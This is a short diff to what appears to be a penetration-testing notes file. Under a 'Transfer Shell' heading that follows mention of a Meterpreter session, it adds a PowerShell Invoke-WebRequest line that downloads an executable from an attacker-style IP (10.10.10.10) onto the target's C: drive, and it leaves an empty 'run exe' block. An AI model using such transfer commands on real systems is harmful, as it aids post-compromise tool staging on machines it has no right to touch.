@@ -330,15 +330,21 @@ If you already have a Meterpreter shell on the target system, you can use the `m
 
 ## Transfer Shell
 
+cmd
 ```powershell
-powershell -c "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Handle.zip' -OutFile C:\handle.zip"
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:80/Handle.exe' -OutFile C:\handle.exe"
 ```
 
+powershell
 ```powershell
 Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Handle.zip' -OutFile C:\handle.zip Expand-Archive -Path C:\handle.zip
 ```
 
+run exe
+```powershell
 
+
+```
 
 
 
